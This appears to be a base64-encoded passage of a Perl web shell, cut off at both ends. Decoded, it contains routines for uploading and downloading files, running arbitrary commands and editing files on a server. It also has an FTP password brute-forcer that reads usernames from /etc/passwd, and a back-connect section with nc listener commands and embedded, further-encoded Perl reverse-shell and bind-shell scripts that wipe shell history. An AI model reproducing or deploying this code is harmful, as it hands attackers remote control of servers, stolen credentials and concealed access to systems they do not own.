lmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0KCXsNCgkJJHJlc3VsdCAuPSAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KCX0NCgllbHNlICMgZmlsZSBpcyBub3QgcHJlc2VudA0KCXsNCgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpDQoJCXsNCgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQoJCQljbG9zZShVUExPQURGSUxFKTsNCgkJCSRyZXN1bHQgLj0gIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KCQkJJHJlc3VsdCAuPSAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJHJlc3VsdCAuPSAiRmFpbGVkOiAkITxicj4iOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCgkNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8ICghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJcmV0dXJuICZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQlyZXR1cm4gJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkNCiMgY29tbWFuZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5IGlzIHN0b3JlZCBpbg0KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlDQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzDQojIHRoZXJlZm9yZSBlcnJvciBtZXNzYWdlcyBjYW5ub3QgYmUgZGlzcGxheWVkLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEV4ZWN1dGVDb21tYW5kDQp7DQoJbXkgJHJlc3VsdD0iIjsNCglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kDQoJew0KCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlDQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCQkkcmVzdWx0IC49ICJDb21tYW5kOiA8cnVuPiRSdW5Db21tYW5kIDwvcnVuPjxicj48dGV4dGFyZWEgY29scz0nJGNvbHMnIHJvd3M9JyRyb3dzJyBzcGVsbGNoZWNrPSdmYWxzZSc+IjsNCgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQ0KCQkkUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSI7DQoJCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQ0KCXsNCgkJJHJlc3VsdCAuPSAgJlNhdmVGaWxlRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSRyZXN1bHQgLj0mUnVuQ21kOw0KCX0NCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIHJ1biBjb21tYW5kDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCnN1YiBSdW5DbWQNCnsNCglteSAkcmVzdWx0PSIiOw0KCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsNCglpZighJFdpbk5UKQ0KCXsNCgkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOw0KCX0NCglpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkDQoJew0KCQkkfD0xOw0KCQkkQ29tbWFuZCAuPSAiIHwiOw0KCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsNCgkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQl7DQoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsNCgkJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoIiRfXG4iKTsNCgkJfQ0KCQkkfD0wOw0KCX0NCgllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMNCgl7DQoJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoJyRDb21tYW5kJyk7DQoJfQ0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZvcm0gU2F2ZSBGaWxlIA0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlRm9ybQ0Kew0KCW15ICRyZXN1bHQgPSIiOw0KCXN1YnN0cigkUnVuQ29tbWFuZCwwLDUpPSIiOw0KCW15ICRmaWxlPSZ0cmltKCRSdW5Db21tYW5kKTsNCgkkc2F2ZT0nPGJyPjxpbnB1dCBuYW1lPSJhIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzYXZlIiBjbGFzcz0ic3VibWl0IiA+JzsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsNCglteSAkZGlyPSI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImd1aSIpLiI8L3NwYW4+IjsNCglpZigtdyAkRmlsZSkNCgl7DQoJCSRyb3dzPSIyMyINCgl9ZWxzZQ0KCXsNCgkJJG1zZz0iPGJyPjxmb250IHN0eWxlPSdmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7JyA+IFBlcm1pc3Npb24gZGVuaWVkITxmb250Pjxicj4iOw0KCQkkcm93cz0iMjAiDQoJfQ0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyNGRkZGRkYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCgkkcmVhZD0oJFdpbk5UKT8idHlwZSI6Imxlc3MiOw0KCSRSdW5Db21tYW5kID0gIiRyZWFkIFwiJFJ1bkNvbW1hbmRcIiI7DQoJJHJlc3VsdCAuPSAgPDxFTkQ7DQoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoNCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KCSRQcm9tcHQNCgk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNDAiIG5hbWU9ImMiPg0KCTxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQoJPGJyPkNvbW1hbmQ6IDxydW4+ICRSdW5Db21tYW5kIDwvcnVuPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSIkZmlsZSIgPiAkc2F2ZSA8YnI+ICRtc2cNCgk8YnI+PHRleHRhcmVhIGlkPSJkYXRhIiBuYW1lPSJkYXRhIiBjb2xzPSIkY29scyIgcm93cz0iJHJvd3MiIHNwZWxsY2hlY2s9ImZhbHNlIj4NCkVORA0KCQ0KCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCSRyZXN1bHQgLj0gICI8L2Zvcm0+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMgU2F2ZSBGaWxlDQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpzdWIgU2F2ZUZpbGUoJCkNCnsNCglteSAkRGF0YT0gc2hpZnQgOw0KCW15ICRGaWxlPSBzaGlmdDsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kRmlsZTsNCglpZihvcGVuKEZJTEUsICI+JEZpbGUiKSkNCgl7DQoJCWJpbm1vZGUgRklMRTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJcmV0dXJuIDE7DQoJfWVsc2UNCgl7DQoJCXJldHVybiAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyIEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCcnV0ZUZvcmNlckZvcm0NCnsNCglteSAkcmVzdWx0PSIiOw0KCSRyZXN1bHQgLj0gPDxFTkQ7DQoNCjx0YWJsZT4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjPGJyPg0KU2ltcGxlIEZUUCBicnV0ZSBmb3JjZXI8YnI+DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPlVzZXI6PGJyPjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InVzZXIiPg0KRU5EDQpjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOw0KJHJlc3VsdCAuPSA8PCdFTkQnOw0KPC90ZXh0YXJlYT48L3RkPg0KPHRkPg0KDQpQYXNzOjxicj4NCjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MNCjEyMyFAIw0KMTIzYWRtaW4NCjEyM2FiYw0KMTIzNDU2YWRtaW4NCjEyMzQ1NTQzMjENCjEyMzQ0MzIxDQpwYXNzMTIzDQphZG1pbg0KYWRtaW5jcA0KYWRtaW5pc3RyYXRvcg0KbWF0a2hhdQ0KcGFzc2FkbWluDQpwQHNzd29yZA0KcEBzc3cwcmQNCnBhc3N3b3JkDQoxMjM0NTYNCjEyMzQ1NjcNCjEyMzQ1Njc4DQoxMjM0NTY3ODkNCjEyMzQ1Njc4OTANCjExMTExMQ0KMDAwMDAwDQoyMjIyMjINCjMzMzMzMw0KNDQ0NDQ0DQo1NTU1NTUNCjY2NjY2Ng0KNzc3Nzc3DQo4ODg4ODgNCjk5OTk5OQ0KMTIzMTIzDQoyMzQyMzQNCjM0NTM0NQ0KNDU2NDU2DQo1Njc1NjcNCjY3ODY3OA0KNzg5Nzg5DQoxMjMzMjENCjQ1NjY1NA0KNjU0MzIxDQo3NjU0MzIxDQo4NzY1NDMyMQ0KOTg3NjU0MzIxDQowOTg3NjU0MzIxDQphZG1pbjEyMw0KYWRtaW4xMjM0NTYNCmFiY2RlZg0KYWJjYWJjDQohQCMhQCMNCiFAIyQlXg0KIUAjJCVeJiooDQohQCMkJCNAIQ0KYWJjMTIzDQphbmh5ZXVlbQ0KaWxvdmV5b3U8L3RleHRhcmVhPg0KPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+DQpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4NCg0KPG9wdGlvbj4wPC9vcHRpb24+DQo8b3B0aW9uPjE8L29wdGlvbj4NCjxvcHRpb24+Mjwvb3B0aW9uPg0KDQo8b3B0aW9uPjM8L29wdGlvbj4NCjwvc2VsZWN0PiANCjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJzdWJtaXQiIHZhbHVlPSJCcnV0ZSBGb3JjZXIiLz48L3RkPjwvdHI+DQo8L2Zvcm0+DQo8L3RhYmxlPg0KRU5EDQpyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXINCnsNCglteSAkcmVzdWx0PSIiOw0KCSRTZXJ2ZXI9JEVOVnsnU0VSVkVSX0FERFInfTsNCglpZigkaW57J3VzZXInfSBlcSAiIikNCgl7DQoJCSRyZXN1bHQgLj0gJkJydXRlRm9yY2VyRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJdXNlIE5ldDo6RlRQOyANCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsNCgkJQHBhc3M9IHNwbGl0KC9cbi8sICRpbnsncGFzcyd9KTsNCgkJY2hvbXAoQHVzZXIpOw0KCQljaG9tcChAcGFzcyk7DQoJCSRyZXN1bHQgLj0gIjxicj48YnI+WytdIFRyeWluZyBicnV0ZSAkU2VydmVyTmFtZTxicj49PT09PT09PT09PT09PT09PT09PT4+Pj4+Pj4+Pj4+Pjw8PDw8PDw8PDw9PT09PT09PT09PT09PT09PT09PTxicj48YnI+XG4iOw0KCQlmb3JlYWNoICR1c2VybmFtZSAoQHVzZXIpDQoJCXsNCgkJCWlmKCEoJHVzZXJuYW1lIGVxICIiKSkNCgkJCXsNCgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpDQoJCQkJew0KCQkJCQkkZnRwID0gTmV0OjpGVFAtPm5ldygkU2VydmVyKSBvciBkaWUgIkNvdWxkIG5vdCBjb25uZWN0IHRvICRTZXJ2ZXJOYW1lXG4iOyANCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQ0KCQkJCQl7DQoJCQkJCQkkcmVzdWx0IC49ICI8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcic+WytdIGZ0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXI8L2E+PGJyPlxuIjsNCgkJCQkJCSRmdHAtPnF1aXQoKTsNCgkJCQkJCWJyZWFrOw0KCQkJCQl9DQoJCQkJCWlmKCEoJGlueydzbGVlcCd9IGVxICIwIikpDQoJCQkJCXsNCgkJCQkJCXNsZWVwKGludCgkaW57J3NsZWVwJ30pKTsNCgkJCQkJfQ0KCQkJCQkkZnRwLT5xdWl0KCk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCSRyZXN1bHQgLj0gIlxuPGJyPj09PT09PT09PT0+Pj4+Pj4+Pj4+IEZpbmlzaGVkIDw8PDw8PDw8PDw9PT09PT09PT09PGJyPlxuIjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCYWNrQmluZEZvcm0NCnsNCglyZXR1cm4gPDxFTkQ7DQoJPGJyPjxicj4NCg0KCTx0YWJsZT4NCgk8dHI+DQoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoJPHRkPkJhY2tDb25uZWN0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4NCgkgUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjciIG5hbWU9ImNsaWVudHBvcnQiIHZhbHVlPSI4MCIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij48L3RkPg0KDQoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+DQoJPC9mb3JtPg0KCTwvdHI+DQoJPHRyPg0KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gQ2xpZW50IGxpc3RlbiBiZWZvcmUgY29ubmVjdCBiYWNrIQ0KCTxicj5bK10gVHJ5IGNoZWNrIHlvdXIgUG9ydCB3aXRoIDxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSJodHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy8iPmh0dHA6Ly93d3cuY2FueW91c2VlbWUub3JnLzwvYT4NCgk8YnI+WytdIENsaWVudCBsaXN0ZW4gd2l0aCBjb21tYW5kOiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPg0KDQoJPC90cj4NCgk8L3RhYmxlPg0KDQoJPGJyPjxicj4NCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CaW5kIFBvcnQ6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4NCg0KCTx0ZD4gUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iMTQxMiIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JpJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij4NCg0KCSBQYXNzd29yZDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJiaW5kcGFzcyIgdmFsdWU9IlRISUVVR0lBQlVPTiI+PC90ZD4NCgk8dGQ+PGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iQmluZCI+PC90ZD4NCgk8L2Zvcm0+DQoJPC90cj4NCgk8dHI+DQoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDaHVjIG5hbmcgY2h1YSBkYyB0ZXN0IQ0KCTxicj5bK10gVHJ5IGNvbW1hbmQ6IDxydW4+bmMgJEVOVnsnU0VSVkVSX0FERFInfSA8c3BhbiBpZD0iYmkiPjE0MTI8L3NwYW4+PC9ydW4+PC9mb250PjwvdGQ+DQoNCgk8L3RyPg0KCTwvdGFibGU+PGJyPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IHVzZSBwZXJsDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmQNCnsNCgl1c2UgTUlNRTo6QmFzZTY0Ow0KCXVzZSBTb2NrZXQ7CQ0KCSRiYWNrcGVybD0iSXlFdmRYTnlMMkpwYmk5d1pYSnNEUXAxYzJVZ1NVODZPbE52WTJ0bGREc05DaVJUYUdWc2JBazlJQ0l2WW1sdUwySmhjMmdpT3cwS0pFRlNSME05UUVGU1IxWTdEUXAxYzJVZ1UyOWphMlYwT3cwS2RYTmxJRVpwYkdWSVlXNWtiR1U3RFFwemIyTnJaWFFvVTA5RFMwVlVMQ0JRUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLU0J2Y2lCa2FXVWdjSEpwYm5RZ0lsc3RYU0JWYm1GaWJHVWdkRzhnVW1WemIyeDJaU0JJYjNOMFhHNGlPdzBLWTI5dWJtVmpkQ2hUVDBOTFJWUXNJSE52WTJ0aFpHUnlYMmx1S0NSQlVrZFdXekZkTENCcGJtVjBYMkYwYjI0b0pFRlNSMVpiTUYwcEtTa2diM0lnWkdsbElIQnlhVzUwSUNKYkxWMGdWVzVoWW14bElIUnZJRU52Ym01bFkzUWdTRzl6ZEZ4dUlqc05DbkJ5YVc1MElDSkRiMjV1WldOMFpXUWhJanNOQ2xOUFEwdEZWQzArWVhWMGIyWnNkWE5vS0NrN0RRcHZjR1Z1S0ZOVVJFbE9MQ0FpUGlaVFQwTkxSVlFpS1RzTkNtOXdaVzRvVTFSRVQxVlVMQ0krSmxOUFEwdEZWQ0lwT3cwS2IzQmxiaWhUVkVSRlVsSXNJajRtVTA5RFMwVlVJaWs3RFFwd2NtbHVkQ0FpTFMwOVBTQkRiMjV1WldOMFpXUWdRbUZqYTJSdmIzSWdQVDB0TFNBZ1hHNWNiaUk3RFFwemVYTjBaVzBvSW5WdWMyVjBJRWhKVTFSR1NVeEZPeUIxYm5ObGRDQlRRVlpGU0VsVFZDQTdaV05vYnlBbld5dGRJRk41YzNSbGJXbHVabTg2SUNjN0lIVnVZVzFsSUMxaE8yVmphRzg3WldOb2J5QW5XeXRkSUZWelpYSnBibVp2T2lBbk95QnBaRHRsWTJodk8yVmphRzhnSjFzclhTQkVhWEpsWTNSdmNuazZJQ2M3SUhCM1pEdGxZMmh2T3lCbFkyaHZJQ2RiSzEwZ1UyaGxiR3c2SUNjN0pGTm9aV3hzSWlrN0RRcGpiRzl6WlNCVFQwTkxSVlE3IjsNCgkkYmluZHBlcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKRUZTUjBNOVFFRlNSMVk3RFFva2NHOXlkQWs5SUNSQlVrZFdXekJkT3cwS0pIQnliM1J2Q1QwZ1oyVjBjSEp2ZEc5aWVXNWhiV1VvSjNSamNDY3BPdzBLSkZOb1pXeHNDVDBnSWk5aWFXNHZZbUZ6YUNJN0RRcHpiMk5yWlhRb1UwVlNWa1ZTTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktXOXlJR1JwWlNBaWMyOWphMlYwT2lR